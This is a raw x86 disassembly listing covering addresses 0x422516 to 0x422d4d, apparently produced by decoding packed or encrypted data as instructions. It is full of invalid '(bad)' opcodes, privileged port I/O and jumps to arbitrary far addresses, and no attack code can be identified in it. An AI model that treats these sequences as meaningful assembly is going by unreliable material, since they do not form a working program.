  422516:	out    0xe3,eax
  422518:	(bad)  
  422519:	inc    edi
  42251b:	std    
  42251c:	fidivr WORD PTR [ebx]
  42251e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42251f:	dec    esp
  422520:	sbb    bh,BYTE PTR [edx]
  422522:	mov    cl,0x38
  422524:	xchg   ebp,eax
  422525:	mov    ebx,0x76c0001
  42252a:	add    BYTE PTR [eax],al
  42252c:	mov    bh,0x7a
  42252e:	sbb    eax,eax
  422530:	rcl    BYTE PTR [edi+0x39],1
  422533:	mov    ds:0xad00a7da,eax
  422538:	jle    0x4224e5
  42253a:	ret    0x9f24
  42253d:	jl     0x42259f
  42253f:	add    edx,DWORD PTR [eax]
  422541:	mov    esp,0xd1074fc
  422546:	lds    ecx,FWORD PTR [edx+0x10]
  422549:	loop   0x4224fd
  42254b:	gs or  bl,0x37
  42254f:	xchg   ecx,eax
  422550:	push   esi
  422551:	popf   
  422552:	cmp    al,0x54
  422554:	push   ecx
  422555:	fs enter 0x27bc,0xc8
  42255a:	and    esi,DWORD PTR [esi]
  42255c:	ret    
  42255d:	leave  
  42255e:	xor    DWORD PTR [ecx+0x35],eax
  422561:	mov    ebx,0x8e638d5f
  422566:	sbb    esi,DWORD PTR [ecx+eax*8+0x16]
  42256a:	ja     0x4225a6
  42256c:	sti    
  42256d:	cdq    
  42256e:	arpl   WORD PTR [ecx],ax
  422570:	sahf   
  422571:	xor    ecx,0xfffffffe
  422574:	push   edx
  422575:	test   eax,0xbaba5cbd
  42257a:	dec    esp
  42257b:	ret    
  42257c:	sar    BYTE PTR [ecx],cl
  42257e:	dec    esp
  42257f:	xlat   BYTE PTR es:[ebx]
  422581:	xor    BYTE PTR [edx-0x457bab82],0x45
  422588:	lock or DWORD PTR [edi+0x45],esp
  42258c:	cdq    
  42258d:	mov    cl,0xdf
  42258f:	mov    esi,esp
  422591:	and    al,0x1c
  422593:	add    esi,ebp
  422595:	nop
  422596:	adc    eax,0x1d63e0c4
  42259b:	adc    DWORD PTR [eax],esp
  42259d:	mov    edx,esi
  42259f:	mov    BYTE PTR [ebp-0x2585561e],cl
  4225a5:	add    al,0x5b
  4225a7:	jo     0x422589
  4225a9:	mov    esp,DWORD PTR [ebx-0x109f7d90]
  4225af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225b0:	adc    dh,BYTE PTR [edi]
  4225b2:	in     al,dx
  4225b3:	jbe    0x4225ef
  4225b5:	cmp    eax,DWORD PTR [ebp+0x3b644c79]
  4225bb:	out    0xc2,al
  4225bd:	fimul  DWORD PTR [edx-0x494cb1f2]
  4225c3:	inc    ebp
  4225c4:	inc    edi
  4225c5:	adc    al,0x45
  4225c7:	in     al,dx
  4225c8:	std    
  4225c9:	icebp  
  4225ca:	sub    BYTE PTR [esi],dl
  4225cc:	add    eax,DWORD PTR [edx-0x3]
  4225cf:	xabort 0xe1
  4225d2:	pop    eax
  4225d3:	popf   
  4225d4:	shl    DWORD PTR [esi-0x7e],0x14
  4225d8:	pop    es
  4225d9:	xor    eax,0xc4988c95
  4225de:	jne    0x4225ec
  4225e0:	mov    ds:0xa55bb8d6,al
  4225e5:	ja     0x4225b2
  4225e7:	xchg   ebx,eax
  4225e8:	test   eax,0xc7e94370
  4225ed:	enter  0x46ec,0x24
  4225f1:	out    dx,al
  4225f2:	test   esi,ebx
  4225f4:	add    dl,BYTE PTR [edx+edx*8+0x5585d490]
  4225fb:	das    
  4225fc:	scas   al,BYTE PTR es:[edi]
  4225fd:	iret   
  4225fe:	ss jmp 0x422679
  422601:	jmp    0xc421e872
  422606:	jecxz  0x42265d
  422608:	in     al,dx
  422609:	call   0x5f27:0xde8df08d
  422610:	or     ecx,ebp
  422612:	push   esp
  422613:	in     al,0x77
  422615:	jle    0x422639
  422617:	jl     0x42266b
  422619:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42261a:	ficomp DWORD PTR [edi]
  42261c:	or     cl,BYTE PTR [ebp+0x41]
  42261f:	mov    ch,0xf6
  422621:	maskmovq mm1,(bad)
  422622:	test   DWORD PTR [esi],0x11d9bc75
  422628:	push   edx
  422629:	mov    bl,0xed
  42262b:	or     BYTE PTR [ebx+0x25439df],ch
  422631:	fild   DWORD PTR [ecx+0x64]
  422634:	sbb    cl,0x78
  422637:	test   DWORD PTR [ebx+ecx*8-0x54025685],esp
  42263e:	out    0xf,al
  422640:	test   al,0xf4
  422642:	aad    0x35
  422644:	jnp    0x4226af
  422646:	adc    esp,DWORD PTR [ebx+0x106fc0fd]
  42264c:	fstp   QWORD PTR [ecx-0x3f]
  42264f:	fidiv  WORD PTR [ecx-0x39d3cc90]
  422655:	cmc    
  422656:	xlat   BYTE PTR ds:[ebx]
  422657:	and    al,ah
  422659:	in     eax,dx
  42265a:	mov    edx,0x55fde5bd
  42265f:	xor    esp,DWORD PTR [eax+eax*2-0x31]
  422663:	mov    bh,dh
  422665:	xor    DWORD PTR [ebx-0x35209ce2],edi
  42266b:	test   WORD PTR [ebp+eax*8-0x20],bp
  422670:	sbb    al,0xbf
  422672:	sbb    al,BYTE PTR [esi+0x7e91a33f]
  422678:	fistp  QWORD PTR [ebp+edx*2+0x7169bc19]
  42267f:	jmp    0x4226ae
  422681:	enter  0x3aa9,0xaf
  422685:	cmp    al,0x37
  422687:	mov    WORD PTR [eax+0x6602982e],cs
  42268d:	in     al,dx
  42268e:	push   edx
  42268f:	(bad)  
  422690:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422691:	rcr    bh,0xdd
  422694:	cld    
  422695:	clc    
  422696:	push   ds
  422697:	inc    esi
  422698:	iret   
  422699:	jnp    0x4226ff
  42269b:	push   esi
  42269c:	inc    esp
  42269d:	sub    dl,BYTE PTR [edi+0x2fbcc5e9]
  4226a3:	and    eax,0x13a86b2b
  4226a8:	mov    bl,0x38
  4226aa:	fdivr  DWORD PTR [esi+ebp*8]
  4226ad:	sbb    al,0xe6
  4226af:	mov    cl,0x7c
  4226b1:	add    edi,edi
  4226b3:	xchg   ebp,eax
  4226b4:	popf   
  4226b5:	arpl   WORD PTR [ebp-0x16],ax
  4226b8:	pop    edi
  4226b9:	xor    al,cl
  4226bb:	mov    ds:0xc5c9128c,al
  4226c0:	dec    ebx
  4226c1:	aas    
  4226c2:	aam    0x87
  4226c4:	repz xor al,0x9f
  4226c7:	lock pusha 
  4226c9:	mov    esp,0x215ef784
  4226ce:	ficom  WORD PTR ds:0xc8fcdf8b
  4226d4:	int    0xd9
  4226d6:	xchg   edi,eax
  4226d7:	mov    WORD PTR [edx+0x15],fs
  4226da:	popa   
  4226db:	mov    WORD PTR [edi-0x35],es
  4226de:	dec    esi
  4226df:	xchg   BYTE PTR [edi+0x18a91c16],al
  4226e5:	or     BYTE PTR [ebx+0x69ef4033],bh
  4226eb:	fidivr DWORD PTR [ebx+0x6567ca9d]
  4226f1:	popa   
  4226f2:	cmp    cl,BYTE PTR [ebp+0x45553160]
  4226f8:	loope  0x42274c
  4226fa:	aam    0x93
  4226fc:	aaa    
  4226fd:	inc    ecx
  4226fe:	sbb    DWORD PTR [ebx+0x7f],ebp
  422701:	cld    
  422702:	pop    ecx
  422703:	inc    eax
  422704:	and    eax,0x9395da25
  422709:	bnd jae 0x4226ee
  42270c:	adc    eax,0xefbdae43
  422711:	inc    ebp
  422712:	ins    BYTE PTR es:[edi],dx
  422713:	aam    0xb8
  422715:	ret    0xf039
  422718:	jg     0x422753
  42271a:	pop    esp
  42271b:	inc    esi
  42271c:	fisub  WORD PTR [edx]
  42271e:	cmp    bl,BYTE PTR ds:0xc1f9ce7b
  422724:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422725:	xchg   ecx,eax
  422726:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422727:	in     al,0x33
  422729:	xchg   ebx,eax
  42272a:	inc    edi
  42272b:	out    dx,eax
  42272c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42272d:	xchg   ebx,eax
  42272e:	hlt    
  42272f:	pop    ebx
  422730:	xor    al,0x4f
  422732:	jmp    0x9143:0x7c79e562
  422739:	mov    ebp,0x2933c0ed
  42273e:	xchg   BYTE PTR [ecx-0x1a9187c0],al
  422744:	or     BYTE PTR [esi+0x6e],al
  422747:	fdivr  QWORD PTR cs:[esi]
  42274a:	xchg   edi,eax
  42274b:	scas   eax,DWORD PTR es:[edi]
  42274c:	dec    eax
  42274d:	adc    esp,edx
  42274f:	pop    eax
  422750:	div    DWORD PTR [ebx+edi*1+0x39e8aa7e]
  422757:	inc    ebx
  422758:	icebp  
  422759:	das    
  42275a:	sub    cl,0xbe
  42275d:	mov    dl,0x8
  42275f:	fld    TBYTE PTR [esi-0x5fd3ed17]
  422765:	inc    eax
  422766:	std    
  422767:	scas   eax,DWORD PTR es:[edi]
  422768:	inc    esi
  422769:	sbb    BYTE PTR [ebp+edx*2+0x50],0x4c
  42276e:	aaa    
  42276f:	nop
  422770:	adc    DWORD PTR [edi-0x6b3b3dea],ebx
  422776:	inc    esp
  422777:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422778:	jmp    0x4227aa
  42277a:	mov    ds:0xfbb5ee46,al
  42277f:	in     al,0xac
  422781:	aad    0xef
  422783:	into   
  422784:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422785:	(bad)  
  422786:	jnp    0x42273a
  422788:	lahf   
  422789:	pop    esi
  42278a:	loop   0x4227e9
  42278c:	enter  0x9fc2,0x32
  422790:	mov    bl,0x62
  422792:	xchg   edi,eax
  422793:	out    0x46,al
  422795:	(bad)
  422799:	in     eax,dx
  42279a:	sar    BYTE PTR [ecx+0x33],1
  42279d:	xchg   ch,dl
  42279f:	mov    al,ds:0xdefd7059
  4227a4:	out    dx,al
  4227a5:	cmp    BYTE PTR [eax],ah
  4227a7:	shr    BYTE PTR [esi-0x69],1
  4227aa:	and    al,0x42
  4227ac:	imul   ebx,DWORD PTR [ebx-0x53fecced],0xffffffae
  4227b3:	jmp    0x2fa1:0x694d8e54
  4227ba:	sub    eax,0x453133d9
  4227bf:	psrlq  mm1,QWORD PTR [edi]
  4227c2:	cli    
  4227c3:	stc    
  4227c4:	je     0x422769
  4227c6:	mov    ebx,0xe6535715
  4227cb:	(bad)  
  4227cc:	mov    esi,0x8e781e0d
  4227d1:	(bad)  
  4227d2:	ror    DWORD PTR [edx],cl
  4227d4:	ja     0x4227f9
  4227d6:	call   0x60a8:0x576d23bd
  4227dd:	push   esi
  4227de:	mov    eax,0x985c2c8a
  4227e3:	mov    ah,0xa4
  4227e5:	idiv   DWORD PTR [edx-0x738210f6]
  4227eb:	in     eax,dx
  4227ec:	int    0xe8
  4227ee:	add    BYTE PTR [eax-0x3a37c7b2],0x12
  4227f5:	repnz pushf 
  4227f7:	push   ds
  4227f8:	inc    edi
  4227f9:	fidiv  DWORD PTR [ecx+0x79]
  4227fc:	jl     0x42284d
  4227fe:	aas    
  4227ff:	inc    esi
  422800:	pop    edx
  422801:	stos   DWORD PTR es:[edi],eax
  422802:	sti    
  422803:	dec    edi
  422804:	and    ah,bl
  422806:	push   ecx
  422807:	pop    ebp
  422808:	pop    ss
  422809:	push   edx
  42280a:	xchg   ecx,eax
  42280b:	popa   
  42280c:	xor    BYTE PTR [ecx-0x54],dl
  42280f:	addr16 push ebx
  422811:	or     BYTE PTR [ebx],cl
  422813:	mov    edi,0xe61f2fbc
  422818:	mov    ebp,0x77d2cc
  42281d:	scas   al,BYTE PTR es:[edi]
  42281e:	inc    eax
  42281f:	jle    0x422872
  422821:	sbb    BYTE PTR [ecx-0x7227ce7c],dh
  422827:	xor    edx,eax
  422829:	out    0x28,al
  42282b:	das    
  42282c:	(bad)  
  42282d:	enter  0xab2c,0x7b
  422831:	es ja  0x422808
  422834:	aam    0xc
  422836:	push   esp
  422837:	sub    BYTE PTR [ebp-0x7d],dh
  42283a:	or     ch,BYTE PTR [esi+eax*1-0x23a3944]
  422841:	jns    0x422805
  422843:	jge    0x422801
  422845:	sub    BYTE PTR [ebp-0x5fdb3428],ch
  42284b:	pusha  
  42284c:	mov    eax,DWORD PTR [ecx+0x536f39dd]
  422852:	ins    BYTE PTR es:[edi],dx
  422853:	in     al,0xb7
  422855:	mov    ebx,0x14846fae
  42285a:	clc    
  42285b:	ja     0x422866
  42285d:	jecxz  0x422860
  42285f:	and    ch,ah
  422861:	aam    0x6c
  422863:	add    ebx,DWORD PTR [edi+0xf]
  422866:	sub    DWORD PTR [edi],ebx
  422868:	mov    DWORD PTR [edi],0xa8b42135
  42286e:	add    ah,BYTE PTR ds:0xc0a15f48
  422874:	stc    
  422875:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  422877:	jecxz  0x422809
  422879:	out    dx,al
  42287a:	int3   
  42287b:	dec    ebp
  42287c:	cld    
  42287d:	mov    dh,0xed
  42287f:	aas    
  422880:	adc    eax,0xd4aef1d4
  422885:	loopne 0x422829
  422887:	mov    ds:0x57c1a02b,eax
  42288c:	mov    esp,0x4f893a59
  422891:	xlat   BYTE PTR gs:[ebx]
  422893:	mov    BYTE PTR [edi+0x26],dl
  422896:	sbb    BYTE PTR [ebp-0x11],bh
  422899:	clc    
  42289a:	xchg   edx,eax
  42289b:	mov    dh,bh
  42289d:	xor    BYTE PTR [esi-0x72],0xf7
  4228a1:	pop    ebx
  4228a2:	sbb    BYTE PTR [esi],ah
  4228a4:	sbb    ch,BYTE PTR [edi-0x55]
  4228a7:	pop    esi
  4228a8:	push   ds
  4228a9:	sub    esp,DWORD PTR [esi+ecx*2]
  4228ac:	in     eax,dx
  4228ad:	cmp    DWORD PTR [eax+eiz*8+0x5],esp
  4228b1:	dec    ecx
  4228b2:	xchg   edx,eax
  4228b3:	into   
  4228b4:	je     0x4228b2
  4228b6:	daa    
  4228b7:	pop    edx
  4228b8:	cmp    al,0xf2
  4228ba:	inc    ecx
  4228bb:	mov    esp,0xbe00b969
  4228c0:	push   ss
  4228c1:	cli    
  4228c2:	test   eax,0x5f02169f
  4228c7:	pop    ebx
  4228c8:	ss out 0x2f,eax
  4228cb:	mov    esi,0xa1d114a4
  4228d0:	jno    0x4228dd
  4228d2:	cmp    BYTE PTR [ecx],0x39
  4228d5:	jno    0x422931
  4228d7:	jge    0x422871
  4228d9:	jg     0x4228e5
  4228db:	nop
  4228dc:	dec    esp
  4228dd:	adc    eax,0x3ece1cb7
  4228e2:	adc    edi,DWORD PTR [ebx]
  4228e4:	shl    BYTE PTR [edx-0x80],1
  4228e7:	(bad)  
  4228e8:	(bad)  
  4228e9:	xor    DWORD PTR [ecx],edx
  4228eb:	cmp    al,BYTE PTR [edi-0x248beb98]
  4228f1:	sub    al,0x1b
  4228f3:	cmp    DWORD PTR [esi-0x513e15d0],edx
  4228f9:	retf   
  4228fa:	popf   
  4228fb:	scas   eax,DWORD PTR es:[edi]
  4228fc:	add    edi,eax
  4228fe:	js     0x4228b7
  422900:	bswap  edi
  422902:	push   0x1
  422904:	add    DWORD PTR [ecx-0x57],esp
  422907:	sti    
  422908:	inc    eax
  422909:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42290a:	loope  0x422968
  42290c:	ds dec edx
  42290e:	mov    al,ds:0xd1d635d9
  422913:	mov    edi,0xfc8604d1
  422918:	sbb    BYTE PTR [ecx+0x63],0xcf
  42291c:	cmp    eax,0xaf3b5912
  422921:	fld    TBYTE PTR [edi-0x52]
  422924:	not    DWORD PTR [edi-0x7e]
  422927:	jne    0x422910
  422929:	jle    0x42297d
  42292b:	mov    edx,0xc1e124ae
  422930:	mov    ebp,0x2f4e7fc5
  422935:	sub    DWORD PTR [ecx-0x4de70e90],0xffffffa7
  42293c:	mov    al,0x4c
  42293e:	in     eax,dx
  42293f:	push   edx
  422940:	sbb    eax,0x1ae4fba
  422945:	pusha  
  422946:	pop    esp
  422947:	lods   eax,DWORD PTR ds:[esi]
  422948:	sbb    BYTE PTR [ebp-0x61],0x40
  42294c:	pop    ebp
  42294d:	(bad)  
  42294e:	pusha  
  42294f:	sti    
  422950:	mov    bl,0xea
  422952:	mov    ?,esp
  422954:	mov    dh,0xc8
  422956:	leave  
  422957:	push   esp
  422958:	pushf  
  422959:	push   eax
  42295a:	fsubr  st,st(3)
  42295c:	inc    ecx
  42295d:	xor    al,0x65
  42295f:	pusha  
  422960:	cmp    eax,0xb0f65b52
  422965:	xchg   esi,eax
  422966:	fdivr  DWORD PTR [edi]
  422968:	lods   al,BYTE PTR ds:[esi]
  422969:	or     cl,cl
  42296b:	(bad)  
  42296c:	sub    DWORD PTR [ebx+0x5e],ecx
  42296f:	jns    0x42297b
  422971:	mov    WORD PTR [eax-0x4f103c5],?
  422977:	push   0xb401e916
  42297c:	inc    esi
  42297d:	mov    bl,0x25
  42297f:	adc    BYTE PTR [edx],al
  422981:	push   cs
  422982:	mov    ds:0x302374a1,al
  422987:	scas   eax,DWORD PTR es:[edi]
  422988:	mov    eax,ds:0x8d03ed80
  42298d:	inc    esi
  42298e:	popa   
  42298f:	test   al,0x29
  422991:	stos   BYTE PTR es:[edi],al
  422992:	sar    edi,1
  422994:	call   0x8f1f6448
  422999:	dec    eax
  42299a:	or     eax,0xedc4d1ac
  42299f:	adc    ebp,0x51
  4229a2:	cmc    
  4229a3:	lock in eax,dx
  4229a5:	call   0x13a16e42
  4229aa:	mov    bl,0xb
  4229ac:	loope  0x4229bd
  4229ae:	xor    al,0x49
  4229b0:	push   ecx
  4229b1:	scas   eax,DWORD PTR es:[edi]
  4229b2:	mov    ch,BYTE PTR [esi+esi*4-0x51]
  4229b6:	dec    edx
  4229b7:	sbb    eax,0xad6a6ce4
  4229bc:	mov    BYTE PTR [edx+0x21],bh
  4229bf:	cmp    dl,BYTE PTR [edx-0x48]
  4229c2:	xchg   esi,eax
  4229c3:	inc    edx
  4229c4:	sub    esp,DWORD PTR cs:[edx-0x3ff635c6]
  4229cb:	imul   esi,edi,0xffffff87
  4229ce:	xor    edx,DWORD PTR [ebp-0x3]
  4229d1:	cmp    bl,ch
  4229d3:	cmp    bh,BYTE PTR [edx]
  4229d5:	jp     0x4229ac
  4229d7:	scas   al,BYTE PTR es:[edi]
  4229d8:	push   ebp
  4229d9:	fwait
  4229da:	adc    BYTE PTR [ebp-0x682ce98e],ch
  4229e0:	retf   0x1765
  4229e3:	xor    al,0xd0
  4229e5:	(bad)  
  4229e6:	leave  
  4229e7:	mul    BYTE PTR [eax]
  4229e9:	mov    eax,0x47fcd956
  4229ee:	cdq    
  4229ef:	dec    ecx
  4229f0:	bound  eax,QWORD PTR [ecx+0x2338db08]
  4229f6:	push   0xffffffff
  4229f8:	int    0x6b
  4229fa:	mov    ebp,0x4b9538b
  4229ff:	pop    edi
  422a00:	lea    ecx,[esi-0x1b]
  422a03:	in     al,0x25
  422a05:	(bad)  
  422a06:	xchg   ecx,eax
  422a07:	ds test eax,0x6611ad0e
  422a0d:	repz fs or al,0x84
  422a11:	push   0xffffff89
  422a13:	test   al,0xfa
  422a15:	sub    ch,0xa3
  422a18:	test   DWORD PTR [edx+ecx*2+0x29],0x6990d3b4
  422a20:	inc    ecx
  422a21:	and    DWORD PTR [esi],ecx
  422a23:	jg     0x422a37
  422a25:	fidivr WORD PTR [esi+ebx*4]
  422a28:	xor    al,0xd
  422a2a:	scas   al,BYTE PTR es:[edi]
  422a2b:	xor    esi,DWORD PTR [ecx+edi*2-0x6982e123]
  422a32:	mov    edi,0x1957a40d
  422a37:	ins    DWORD PTR es:[edi],dx
  422a38:	retf   
  422a39:	mov    WORD PTR [ecx],es
  422a3b:	(bad)  
  422a3c:	and    eax,0x5996fa39
  422a41:	pop    esi
  422a42:	dec    eax
  422a43:	or     al,BYTE PTR [ebx]
  422a45:	out    dx,eax
  422a46:	cmp    BYTE PTR [edx-0x69],ch
  422a49:	lods   eax,DWORD PTR ds:[esi]
  422a4a:	lods   eax,DWORD PTR ds:[esi]
  422a4b:	jno    0x422a9c
  422a4d:	jae    0x422a44
  422a4f:	jle    0x4229d5
  422a51:	add    edx,DWORD PTR [ebx+0x4082e254]
  422a57:	mul    eax
  422a59:	inc    ebp
  422a5a:	dec    eax
  422a5b:	add    eax,0xa0af9468
  422a60:	aad    0xad
  422a62:	mov    ds:0x6af80e48,al
  422a67:	outs   dx,BYTE PTR ds:[esi]
  422a68:	popa   
  422a69:	shl    BYTE PTR [edx-0x25],cl
  422a6c:	gs sbb eax,0xf6eeeaf2
  422a72:	repnz test eax,0x22a05fe
  422a78:	add    BYTE PTR [edx-0x7f],ah
  422a7b:	jo     0x422a43
  422a7d:	xor    BYTE PTR [edx+0x45],ah
  422a80:	push   ds
  422a81:	call   0x4604:0x4ca8c969
  422a88:	or     al,0x39
  422a8a:	arpl   WORD PTR [eax],cx
  422a8c:	xchg   ebp,eax
  422a8d:	push   cs
  422a8e:	lds    edx,FWORD PTR [edi]
  422a90:	in     al,0x9e
  422a92:	inc    ch
  422a94:	sbb    ebp,DWORD PTR [ebx+0x1d]
  422a97:	adc    al,0x51
  422a99:	mov    cl,0xc0
  422a9b:	xchg   cl,ch
  422a9d:	(bad)  
  422a9e:	mul    BYTE PTR [ebx]
  422aa0:	ja     0x422a5f
  422aa2:	mov    dl,0x7
  422aa4:	fs pusha 
  422aa6:	and    BYTE PTR [ebx-0x3578aa03],0x74
  422aad:	sti    
  422aae:	pop    ecx
  422aaf:	xor    al,BYTE PTR [esi]
  422ab1:	(bad)  
  422ab2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ab3:	es jge 0x422a86
  422ab6:	mov    al,ds:0xb8c180dc
  422abb:	adc    eax,0x2f118283
  422ac0:	paddusw mm0,QWORD PTR [eax+edx*2]
  422ac4:	nop
  422ac5:	test   eax,0xc50945b6
  422aca:	aam    0x9c
  422acc:	push   ebp
  422acd:	mov    ebx,0x2042ea31
  422ad2:	and    BYTE PTR [ecx-0x3f449f48],0x9c
  422ad9:	and    ebx,0xbba31f3b
  422adf:	push   cs
  422ae0:	daa    
  422ae1:	pop    es
  422ae2:	icebp  
  422ae3:	inc    esp
  422ae4:	push   ecx
  422ae5:	inc    ecx
  422ae6:	shl    BYTE PTR ds:0xe291b24d,1
  422aec:	pop    edx
  422aed:	int3   
  422aee:	cmp    eax,DWORD PTR [edi]
  422af0:	outs   dx,BYTE PTR ds:[esi]
  422af1:	in     eax,0xda
  422af3:	push   edx
  422af4:	sbb    al,0x25
  422af6:	ret    0xe300
  422af9:	mov    dh,0xac
  422afb:	retf   0xeb32
  422afe:	cmp    al,0xc8
  422b00:	jnp    0x422b2e
  422b02:	mov    ebx,0x88185931
  422b07:	pushf  
  422b08:	ins    BYTE PTR es:[edi],dx
  422b09:	lea    eax,[esi-0x4b]
  422b0c:	pop    ebx
  422b0d:	push   ecx
  422b0e:	inc    eax
  422b0f:	sbb    ax,0xd9a7
  422b13:	jl     0x422b87
  422b15:	sbb    al,0x93
  422b17:	fnstsw WORD PTR [ecx+0x15]
  422b1a:	adc    eax,0xdf4f18af
  422b1f:	(bad)
  422b22:	add    eax,0x478f4fbb
  422b27:	and    DWORD PTR [esi-0x360b3a5c],ecx
  422b2d:	sbb    al,al
  422b2f:	add    BYTE PTR [ebx+0x48d2009c],al
  422b35:	mov    BYTE PTR [edi],cl
  422b37:	mov    al,ds:0x445f34ea
  422b3c:	stc    
  422b3d:	pop    ebx
  422b3e:	stos   BYTE PTR es:[edi],al
  422b3f:	into   
  422b40:	xor    esi,DWORD PTR [eax+ebp*4-0x39]
  422b44:	(bad)  
  422b45:	add    ebp,eax
  422b47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b48:	jb     0x422b55
  422b4a:	(bad)  
  422b4b:	jb     0x422ae0
  422b4d:	fcomp  DWORD PTR [esi+0x4f]
  422b50:	lahf   
  422b51:	push   0xfffffff1
  422b53:	cmp    DWORD PTR [eax+0x5f],esp
  422b56:	imul   esp,DWORD PTR [esi+ebx*4-0x789ec36c],0x7ea5165a
  422b61:	mov    ch,0xb2
  422b63:	push   cs
  422b64:	xor    eax,0x8da2ea3c
  422b69:	imul   eax,DWORD PTR [edi+0xe],0x56aaef2a
  422b70:	fsubr  st(6),st
  422b72:	popa   
  422b73:	inc    ebx
  422b74:	int    0x4d
  422b76:	adc    bh,BYTE PTR gs:[esp+eax*2]
  422b7a:	mov    DWORD PTR [ebx],edx
  422b7c:	in     al,dx
  422b7d:	cmp    dh,al
  422b7f:	and    DWORD PTR [esi-0x53],0x19
  422b83:	mov    eax,0xa9e84afd
  422b88:	mov    ch,0xd6
  422b8a:	xor    bl,BYTE PTR [ecx+0x79]
  422b8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b8e:	je     0x422b15
  422b90:	mov    eax,0x2f3c886
  422b95:	out    dx,eax
  422b96:	inc    ebx
  422b97:	cmp    ebp,DWORD PTR [eax-0x27]
  422b9a:	dec    edi
  422b9b:	(bad)  
  422b9c:	adc    BYTE PTR [eax-0x133801a0],al
  422ba2:	scas   eax,DWORD PTR es:[edi]
  422ba3:	push   edx
  422ba4:	popa   
  422ba5:	pop    ds
  422ba6:	fldcw  WORD PTR [edx]
  422ba8:	gs daa 
  422baa:	jge    0x422c1b
  422bac:	div    DWORD PTR [edx]
  422bae:	xchg   esp,eax
  422baf:	inc    edx
  422bb0:	fwait
  422bb1:	in     eax,0x0
  422bb3:	add    al,0x7d
  422bb5:	ret    0x1b9f
  422bb8:	cs stc 
  422bba:	dec    esp
  422bbb:	add    eax,DWORD PTR [ebp+0x5a3a90e4]
  422bc1:	out    0x48,al
  422bc3:	out    dx,al
  422bc4:	popf   
  422bc5:	adc    dh,BYTE PTR [ebx]
  422bc7:	xchg   DWORD PTR [eax+ecx*4-0x1b],ebx
  422bcb:	and    ebp,DWORD PTR [edi]
  422bcd:	bound  eax,QWORD PTR [eax-0x41]
  422bd0:	add    ah,BYTE PTR [eax+0x9b5e89]
  422bd6:	jg     0x422bd6
  422bd8:	push   cs
  422bd9:	inc    esp
  422bda:	mov    esp,0xa2520f03
  422bdf:	mov    ch,0x9c
  422be1:	push   eax
  422be2:	cmp    DWORD PTR [edi+0x6ab04281],esi
  422be8:	call   0x1462:0xa349b032
  422bef:	sub    edx,ebp
  422bf1:	in     al,dx
  422bf2:	push   es
  422bf3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422bf4:	shl    DWORD PTR [eax-0x527ac96d],1
  422bfa:	xchg   esi,eax
  422bfb:	or     DWORD PTR [edx],ecx
  422bfd:	mov    bl,0xab
  422bff:	adc    BYTE PTR [eax-0x3aed9455],bh
  422c05:	adc    al,0xce
  422c07:	sub    esi,DWORD PTR [edi-0x14]
  422c0a:	sub    eax,DWORD PTR [ebx+0x8]
  422c0d:	and    eax,0x62547cce
  422c12:	gs sub al,0xf8
  422c15:	sti    
  422c16:	mov    ch,0x75
  422c18:	fisub  DWORD PTR [ecx]
  422c1a:	and    al,0x71
  422c1c:	dec    ebx
  422c1d:	imul   edx,edi,0x99332779
  422c23:	xchg   edx,eax
  422c24:	and    DWORD PTR [ecx-0x1228ff44],ebx
  422c2a:	mov    bl,0xd9
  422c2c:	mov    BYTE PTR [edx],dl
  422c2e:	jg     0x422bfd
  422c30:	mov    ?,WORD PTR [esi]
  422c32:	rcl    BYTE PTR [esi],cl
  422c34:	mov    dh,0x11
  422c36:	es push ebp
  422c38:	scas   al,BYTE PTR es:[edi]
  422c39:	into   
  422c3a:	inc    edi
  422c3b:	add    ebp,DWORD PTR [eax+0xb895deb]
  422c41:	mov    edi,0x2d89cdaf
  422c46:	mov    esp,gs
  422c48:	xor    DWORD PTR ds:0x4d7634c5,0x62
  422c4f:	dec    edi
  422c50:	hlt    
  422c51:	mov    esp,0x683af707
  422c56:	lds    ebx,FWORD PTR [esi+esi*4-0x1f274e95]
  422c5d:	imul   ecx,esi,0xd5c64ef2
  422c63:	mov    cl,0x49
  422c65:	std    
  422c66:	mov    ds:0x3f35c0be,eax
  422c6b:	sbb    cl,bl
  422c6d:	push   ss
  422c6e:	dec    esi
  422c6f:	je     0x422ca7
  422c71:	inc    esp
  422c72:	loope  0x422cda
  422c74:	ret    0x420
  422c77:	std    
  422c78:	jge    0x422cd4
  422c7a:	imul   ebp,ecx,0x70
  422c7d:	lock pop ebp
  422c7f:	push   0x2a95a3ad
  422c84:	nop
  422c85:	test   BYTE PTR [esi+eax*8+0x64],ch
  422c89:	mov    al,BYTE PTR [edx]
  422c8b:	in     al,dx
  422c8c:	jge    0x422ce3
  422c8e:	dec    ebx
  422c8f:	ror    DWORD PTR [ecx-0x41dd66ee],cl
  422c95:	push   esp
  422c96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c97:	jae    0x422c99
	...
  422d11:	add    BYTE PTR [eax],al
  422d13:	add    BYTE PTR [esi-0x8131a83],cl
  422d19:	cld    
  422d1a:	(bad)  
  422d1b:	jg     0x422d8f
  422d1d:	and    eax,0x8c411474
  422d22:	es push eax
  422d24:	add    ebx,eax
  422d26:	add    DWORD PTR [eax],eax
  422d28:	ins    BYTE PTR es:[edi],dx
  422d29:	pop    es
  422d2a:	add    BYTE PTR [eax],al
  422d2c:	das    
  422d2d:	pop    ebx
  422d2e:	test   eax,0x1d47fa5
  422d33:	int    0xe0
  422d35:	retf   
  422d36:	cmp    BYTE PTR [ebx-0x72],bh
  422d39:	sahf   
  422d3a:	mov    ch,0x49
  422d3c:	or     BYTE PTR [ebp+0x312787cf],cl
  422d42:	xchg   edi,eax
  422d43:	gs je  0x422d7c
  422d46:	out    0x6e,al
  422d48:	mov    ds:0x3feaea8f,eax
  422d4d:	cmp    BYTE PTR ds:0xc64c1b78,ch
